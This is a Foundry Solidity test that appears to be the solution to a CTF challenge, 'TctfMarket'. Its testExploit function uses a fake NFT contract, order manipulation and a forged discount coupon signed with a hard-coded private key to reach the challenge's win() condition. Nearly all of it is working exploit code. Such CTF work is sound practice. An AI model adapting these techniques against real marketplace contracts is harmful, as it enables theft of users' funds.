// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/Test.sol";
import "../src/Task.sol";
import "../src/FakeNFT.sol";

contract FoundrySolve is Test {
    TctfMarket market;
    FakeNFT fakeNFT;
    TctfToken token;
    TctfNFT NFT;
    address deployer = address(0xcafebebe);
    address user = 0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199;
    uint256 pvk = 0xdf57089febbacf7ba0bc227dafbffa9fc08a93fdc68e1e42411a14efcf23656e;

    function setUp() public {
        vm.label(user, "user");
        vm.label(deployer, "deployer");
        vm.startPrank(deployer, deployer);
        market = new TctfMarket();
        vm.stopPrank();

        token = market.tctfToken();
        NFT = market.tctfNFT();
    }

    function testExploit() public {
        vm.startPrank(user);
        vm.setNonce(user, 30);
        fakeNFT = new FakeNFT();

        emit log_address(address(fakeNFT));

        Coupon memory coupon;
        Signature memory signature;
        SignedCoupon memory scoupon;
        Order memory order;

        token.airdrop(); // get 5 tokens

        fakeNFT.mint(address(market), 1);
        market.purchaseTest(address(fakeNFT), 1, 1337);

        token.approve(address(market), 1337 + 5);

        fakeNFT.mint(user, 2);
        fakeNFT.approve(address(fakeNFT), 2);

        market.createOrder(address(fakeNFT), 2, 1);
        market.purchaseOrder(0); 
        market.purchaseOrder(1);

        coupon.orderId = 1;
        coupon.newprice = 1;
        coupon.issuer = user;
        coupon.user = user;
        coupon.reason = "rkm0959";

        order = market.getOrder(0);

        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );

        (signature.v, signature.rs[0], signature.rs[1]) = vm.sign(pvk, keccak256(serialized));

        scoupon.coupon = coupon;
        scoupon.signature = signature;

        emit log_uint(uint256(signature.v));
        emit log_bytes32(signature.rs[0]);
        emit log_bytes32(signature.rs[1]);
        
        market.purchaseWithCoupon(scoupon);

        market.win();
    }
}